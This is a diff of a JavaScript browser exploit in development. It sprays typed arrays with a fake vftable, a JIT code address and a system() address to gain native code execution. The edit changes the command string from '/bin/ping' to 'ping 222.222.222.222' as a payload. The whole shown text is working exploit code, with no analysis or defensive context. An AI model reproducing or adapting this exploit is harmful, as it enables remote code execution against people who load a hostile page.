@@ -1,5 +1,5 @@
 <script>	
-alert("start9");
+alert("start6");
 function func2(){
 for(var i=0;i<0x1000;i++){ 
 
@@ -160,9 +160,12 @@ for(var i=typedarray_index;i<typedarray_index+0x40/4;i++){
 spray[spray_index][typedarray_index]=vftable;
 spray[spray_index][typedarray_index+0x30/4]=0x10000;//length
 spray[spray_index][typedarray_index+0x38/4]=jitcode_addr-0x18;//addr;
-spray[spray_index][typedarray_index+0x40/4]=0x0;// /bin/ping
-spray[spray_index][typedarray_index+0x44/4]=0x6E69702F;
-spray[spray_index][typedarray_index+0x48/4]=0x00000067;
+spray[spray_index][typedarray_index+0x40/4]=0x676E6970;// /bin/ping
+spray[spray_index][typedarray_index+0x44/4]=0x32323220;
+spray[spray_index][typedarray_index+0x48/4]=0x3232322E;
+spray[spray_index][typedarray_index+0x4c/4]=0x3232322E;
+spray[spray_index][typedarray_index+0x50/4]=0x3232322E;
+spray[spray_index][typedarray_index+0x54/4]=0x00000000;
 spray[spray_index][typedarray_index+0x100/4]=system_addr;
 var jit_index=typedarray_index+0x38/4;
 var typedarray=spray[spray_index];
